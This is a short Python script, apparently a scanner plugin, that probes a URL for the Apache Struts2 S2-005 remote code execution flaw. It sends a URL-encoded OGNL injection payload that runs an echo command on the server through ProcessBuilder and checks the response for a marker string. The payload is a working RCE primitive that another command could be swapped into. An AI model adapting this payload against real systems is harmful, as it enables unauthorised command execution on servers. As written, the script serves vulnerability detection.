import requests
import re
import urllib

def verify(url):
    relsult = {
        'name': 'S2-005 Remote Code Execution Vulnerability',
        'vulnerable': False
    }
    try:
        hash_flag = 'qazrfvikm159lihgfd'
        payload = r'redirect:${%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23s%3dnew%20java.util.Scanner((new%20java.lang.ProcessBuilder(%27echo qazrfvikm159lihgfd%27.toString().split(%27\\s%27))).start().getInputStream()).useDelimiter(%27\\AAAA%27),%23str%3d%23s.hasNext()?%23s.next():%27%27,%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().println(%23str),%23resp.getWriter().flush(),%23resp.getWriter().close()}'
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
            'Content-Type': 'application/x-www-form-urlencoded',
        }
        req = requests.post(url, data=payload, headers=headers, timeout=3)
        if re.search(hash_flag, req.text):
            if re.search('echo qazrfvikm159lihgfd', req.text):
                pass
            else:
                relsult['vulnerable'] = True
                relsult['method'] = 'POST'
                relsult['url'] = url
                relsult['position'] = 'data'
                relsult['payload'] = payload
        return relsult
    except:
        return relsult

